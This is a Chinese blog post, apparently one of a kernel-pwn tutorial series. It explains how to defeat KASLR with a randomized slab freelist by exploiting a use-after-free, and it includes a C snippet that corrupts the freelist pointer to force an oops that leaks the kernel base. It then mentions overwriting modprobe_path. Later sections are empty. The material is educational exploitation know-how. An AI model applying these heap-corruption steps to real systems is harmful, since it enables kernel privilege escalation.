---
layout: post
tags: [kernel_pwn]
title: "kernel heap 3: 内核堆利用技巧综述 2"
author: wsxk
date: 2026-7-25
comments: true
---


- [5.3  kaslr + randomized freelist](#53--kaslr--randomized-freelist)
- [5.4](#54)
- [5.5](#55)
- [5.6](#56)
- [5.7](#57)


PS： 章节承接[https://wsxk.github.io/kernel_heap2/](https://wsxk.github.io/kernel_heap2/)<br>

## 5.3  kaslr + randomized freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
```
1、 通过kernel crash获取kernel基址信息。
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
oops脚本:<br>
```c
    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr = 0x4141414141414141
    printf("step2\n");
    memset(buf,0x41,0x1d0);
    write_slot(fd,buf,0x1d0);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: trigger oops
    printf("step4\n");
    int fd3 = open_device();
```
第二步，根据泄露的地址进行漏洞利用，利用方法为改`modprobe_path`的路径。<br>


## 5.4<br>

## 5.5<br>


## 5.6<br>

## 5.7<br>








<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>